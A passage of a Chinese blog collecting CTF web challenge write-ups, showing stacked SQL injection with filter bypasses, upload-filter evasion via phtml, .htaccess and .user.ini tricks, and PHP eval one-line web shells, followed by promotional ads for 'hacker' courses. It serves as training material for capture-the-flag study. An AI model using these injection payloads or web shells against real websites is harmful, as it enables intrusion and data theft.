1、题目如下： <img src="https://img-blog.csdnimg.cn/20210607212213738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210607212240159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2、注入类型判断：

```
1'   			# 报错
1'#  			# 正常且为True
1' and 1=1#     # 正常且为True
1' and 1=2#     # 正常且为False


```

如下所示： <img src="https://img-blog.csdnimg.cn/20210607212530203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210607223459263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

3、判断列数： <img src="https://img-blog.csdnimg.cn/20210607223909926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210607223931880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4、进一步使用如下 Payoad 尝试读取数据库名称:

```
1' union select database(), user() #


```

发现过滤了 select，也无法通过大小写绕过： <img src="https://img-blog.csdnimg.cn/20210607224137862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">5、使用堆叠注入获取数据库名称：

```
?inject=1';show databases;#


```

效果如下： <img src="https://img-blog.csdnimg.cn/20210607225058179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">6、获取数据库表信息：

```
?inject=1';show tables;#


```

执行效果如下： <img src="https://img-blog.csdnimg.cn/2021060722523440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">7、查看列信息：

```
?inject=1';show columns from `1919810931114514`;#


```

执行效果如下： <img src="https://img-blog.csdnimg.cn/20210607230035984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">8、综上我们可以得知 flag 存在于 supersqli 数据库中的 1919810931114514 表的 flag 字段。接下来要读取此字段内的数据，我们要执行的目标语句是：

```
select * from `1919810931114514`;


```

这里需要绕过 select 的限制，我们可以使用预编译的方式。预编译相关语法如下：

```
set       用于设置变量名和值
prepare   用于预备一个语句，并赋予名称，以后可以引用该语句
execute   执行语句
deallocate prepare 用来释放掉预处理的语句


```

直接看 Payload 就懂了：

```
?inject=1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#
拆分开来如下：
?inject=1';
set @sql = CONCAT('se','lect * from `1919810931114514`;');
prepare stmt from @sql;
EXECUTE stmt;
#


```

执行结果如下： <img src="https://img-blog.csdnimg.cn/20210607231613402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 9、这里检测到了 set 和 prepare 关键词，但 strstr 这个函数并不能区分大小写，我们将其大写即可，最终 Payload 如下：

```
?inject=1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#
拆分开来如下：
?inject=1';
Set @sql = CONCAT('se','lect * from `1919810931114514`;');
Prepare stmt from @sql;
EXECUTE stmt;
#


```

获得 Flag：

<img src="https://img-blog.csdnimg.cn/20210607231719682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

### No.13 SUCTF Easysql 之堆叠注入

1、题目如下： <img src="https://img-blog.csdnimg.cn/2021060814551980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210608145538379.png" alt="在这里插入图片描述"> 2、先试试堆叠注入查询数据库名称： <img src="https://img-blog.csdnimg.cn/20210608145624655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2、进一步通过堆叠注入查询表名： <img src="https://img-blog.csdnimg.cn/20210608145723283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3、进一步想读取字段名，发现有过滤： <img src="https://img-blog.csdnimg.cn/20210608150415771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">在这查列名发现 from 进入了黑名单，无法进展。经查（源码泄露），背后逻辑是：

```
select $_POST[query] || flag from flag


```

如何判断结构是这样？？因为在输入任意字符后输出结果都为 Array ( [0] =&gt; 1 )，那这个 1 肯定是或运算产生的布尔值，所有此处一定有或运算。

**4、官方解法：**

```
1;set sql_mode=PIPES_AS_CONCAT;select 1


```

Payload 释义：

```
1、构造成select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag，
2、其中 PIPES_AS_CONCAT 能将 || 视为字符串连接符而非或运算符，
3、实际运行为select 1;set sql_mode=PIPES_AS_CONCAT;select "1"+flag from Flag


```

执行效果如下： <img src="https://img-blog.csdnimg.cn/2021060815093516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

### No.14 极客大挑战 phtml 上传绕过

1、看题目： <img src="https://img-blog.csdnimg.cn/20210609093615454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2021060909363829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 2、可正常上传图片文件，但是不允许上传 PHP 文件： <img src="https://img-blog.csdnimg.cn/20210609094109667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210609095344127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 3、常见的 PHP 文件后缀绕过可试一下`php,php3,php4,php5,phtml`，如下发现 phtml 后缀的有可能绕过，但是服务端过滤了`&lt;?`符号： <img src="https://img-blog.csdnimg.cn/20210609101055312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210609101126749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4、服务端过滤了`&lt;?`符号，没关系，先来了解下 phtml 后缀，phtml 一般是指嵌入了 php 代码的 html 文件，但是同样也会作为 php 解析。因此可以构造以下 Payload：

```
GIF89a
&lt;script language="php"&gt;eval($_REQUEST['attack'])&lt;/script&gt;


```

可成功上传： <img src="https://img-blog.csdnimg.cn/20210609101648255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">猜测上传的路径为 /upload，成功访问 phtml 文件： <img src="https://img-blog.csdnimg.cn/20210609101806994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">5、菜刀连接，获得 Flag： <img src="https://img-blog.csdnimg.cn/20210609102128999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210609102159224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

### No.15 MRCTF .htaccess 上传漏洞

1、先来看看题目：

<img src="https://img-blog.csdnimg.cn/20210611150006990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210611150021521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2、发现上传 jpg 图片都不行……上传 php、php3、phtml 更不行： <img src="https://img-blog.csdnimg.cn/20210611150458922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210611150514857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 3、本题主要涉及 `.htaccess` 上传漏洞的知识，可参见 ，来看下相关核心知识： <img src="https://img-blog.csdnimg.cn/20210611145648476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 故关键是向服务器上传一个如下的`.htaccess`文件，使得服务器把 jpg 文件解析成 php 脚本：

```
AddType application/x-httpd-php .jpg


```

故上传如下文件： <img src="https://img-blog.csdnimg.cn/20210611150725664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4、接着上传 `.jpg` 后缀的 PHP 一句话木马： <img src="https://img-blog.csdnimg.cn/2021061115091392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 5、上菜刀连接： <img src="https://img-blog.csdnimg.cn/20210611151038929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">根目录获得 flag： <img src="https://img-blog.csdnimg.cn/20210611151139694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

### No.16 SUCTF user.ini文件上传漏洞

1、先来看看题目： <img src="https://img-blog.csdnimg.cn/20210611155844129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210611155851951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2、可正常上传 jpg 文件，但是 `php、php3、htaccess` 等类型的文件均被过滤了： <img src="https://img-blog.csdnimg.cn/2021061116034122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210611160356382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3、此题考查 user.ini 文件构成的 PHP 后门，推荐阅读博文： 进行漏洞原理学习。`.user.ini`实际上就是一个可以由用户“自定义”的 php.ini，我们能够自定义的设置是模式为 “PHP_INI_PERDIR 、 PHP_INI_USER” 的设置，同时在 php 配置项中有两个比较有意思的项：

```
auto_prepend_file 和 auto_append_file


```

相当于指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了 require() 函数。auto_prepend_file 是在文件前插入，而 auto_append_file 是在文件最后才插入。所以先上传一个 user.ini 文件： <img src="https://img-blog.csdnimg.cn/20210611163742943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现文件类型校验，尝试使用 GIF89a 文件头绕过： <img src="https://img-blog.csdnimg.cn/20210611163928332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">此处的 Payload：

```
GIF89a
auto_prepend_file=1.jpg


```

5、然后需要进一步上传包含一句话木马的图片即可： <img src="https://img-blog.csdnimg.cn/2021061116411890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现过滤了 `&lt;?`，那就使用如下 Payload：

```
&lt;script language="php"&gt;eval($_REQUEST['Tr0e'])&lt;/script&gt;


```

重新上传： <img src="https://img-blog.csdnimg.cn/20210611164301627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">糟糕……忘记加 `GIF89a` 伪造图片文件头，火速补上，成功上传： <img src="https://img-blog.csdnimg.cn/20210611172645257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

注意可以观察到在所上传的文件目录存在 index.php 文件，这是 `user.ini` 文件构成的 PHP 后门的利用条件之一！

6、接下来借助 index.php 包含图片木马，获得 flag： <img src="https://img-blog.csdnimg.cn/20210611172440171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210611172505215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210611172533699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"># 学习资料分享

当然，**只给予计划不给予学习资料的行为无异于耍流氓**，### 如果你对网络安全入门感兴趣，那么你点击这里**👉**

**如果你对网络安全感兴趣，学习资源免费分享，保证100%免费！！！（嘿客入门教程）**

**👉网安（嘿客）全套学习视频👈**

我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。

#### 

#### <img src="https://img-blog.csdnimg.cn/img_convert/d1c617b78ee48eda7601e5b803e69276.png" alt="img">

#### **👉网安（嘿客红蓝对抗）所有方向的学习路线****👈**

对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。

#### <img src="https://img-blog.csdnimg.cn/img_convert/de55dfd737dae0cf88e416d0454b17a8.png" alt="img">

#### 学习资料工具包

压箱底的好资料，全面地介绍网络安全的基础理论，包括逆向、八层网络防御、汇编语言、白帽子web安全、密码学、网络安全协议等，将基础理论和主流工具的应用实践紧密结合，有利于读者理解各种主流工具背后的实现机制。

<img src="https://img-blog.csdnimg.cn/9609a53465cf4253b492a5185896fa71.png" alt="在这里插入图片描述">

**面试题资料**

独家渠道收集京东、360、天融信等公司测试题！进大厂指日可待！ <img src="https://img-blog.csdnimg.cn/f5f267c281c543fb9cc9af53b9003a37.png" alt="在这里插入图片描述">

#### **👉<strong><strong>嘿客必备开发工具**</strong>👈</strong>

工欲善其事必先利其器。学习**嘿**客常用的开发软件都在这里了，给大家节省了很多时间。

#### 这份完整版的网络安全（**嘿**客）全套学习资料已经上传至CSDN官方，朋友们如果需要点击下方链接**也可扫描下方微信二v码获取网络工程师全套资料**【保证100%免费】

#### <img src="https://img-blog.csdnimg.cn/img_convert/16c400294b6fda8f01400f24f1f12b0c.png" alt="在这里插入图片描述">

#### 如果你对网络安全入门感兴趣，那么你点击这里**👉**
